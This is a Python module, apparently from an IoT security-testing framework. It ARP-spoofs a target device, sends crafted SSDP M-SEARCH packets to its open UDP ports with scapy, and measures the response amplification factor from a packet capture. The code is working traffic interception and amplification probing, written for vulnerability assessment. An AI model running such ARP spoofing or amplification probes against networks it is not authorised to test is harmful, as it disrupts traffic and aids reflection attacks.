
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *
import threading
from arp_spoof import ArpSpoof
import socket
import sys

class Ssdp(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(Ssdp, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        target = self.device['ip']
        global arpspoof
        arpspoof = ArpSpoof("ArpSpoof", self.config, self.device)

        if self.device["vulnerable_ports"] is None:
            result = {"status": "no open ports"}
            return

        if "udp" not in self.device["vulnerable_ports"].keys():
            result = {"status": "no open ports"}
            return

        if "open" not in self.device["vulnerable_ports"]["udp"].keys():
            result = {"status": "no open ports"}
            return

        self.running = True
        arp_status = {}
        tarp = threading.Thread(target=arpspoof.initialize, args=(arp_status,))
        tarp.start()
        time.sleep(5)

        # udpS = threading.Thread(target=self.udpServer)
        # udpS.start()
        # time.sleep(2)

        packetCount = self.config['packet_count']

        for port in self.device["vulnerable_ports"]["udp"]["open"]:
            for x in range(0, packetCount):
                SSDP_ADDR = "239.255.255.250";
                SSDP_PORT = 1900;
                SSDP_MX = 1
                SSDP_ST = "ssdp:all"

                payload = "M-SEARCH * HTTP/1.1\r\n" + \
                          "HOST: %s:%d\r\n" % (SSDP_ADDR, SSDP_PORT) + \
                          "MAN: \"ssdp:discover\"\r\n" + \
                          "MX: %d\r\n" % (SSDP_MX,) + \
                          "ST: %s\r\n" % (SSDP_ST,) + "\r\n";
                spoofed_packet = IP(dst=target) / UDP(sport=5001, dport=port) / payload
                send(spoofed_packet)
                time.sleep(0.5)

        arpspoof.shutdown()
        tarp.join()
        # udpS.join()

        file_prefix = self.config["file_prefix"]
        filename = 'results/' + self.device['time'] + '/' + file_prefix + '.pcap'
        pcap = rdpcap(filename)
        sessions = pcap.sessions()
        vulnerable = False
        for session in sessions:
            for packet in sessions[session]:
                try:
                    if packet['IP'].dst == target and packet['SSDP'].type == 8:
                        initialPacketSize = len(packet)

                    if packet['IP'].src == target and packet['SSDP'].type == 0 and (not initialPacketSize == 0):
                        result.update({"amplification_factor": len(packet) / initialPacketSize})
                        vulnerable = True
                except:
                    pass

        if vulnerable:
            result.update({"status": "vulnerable"})
        else:
            result.update({"status": "not_vulnerable"})
        return

    def udpServer(self):
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Bind the socket to the port
        server_address = ('localhost', 1900)
        sock.bind(server_address)
        while self.running:
            data, address = sock.recvfrom(4096)
            #
            # print >> sys.stderr, 'received %s bytes from %s' % (len(data), address)
            # print >> sys.stderr, data

            if data:
                sent = sock.sendto(data, address)

    def shutdown(self):
        global arpspoof
        arpspoof.shutdown()
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]
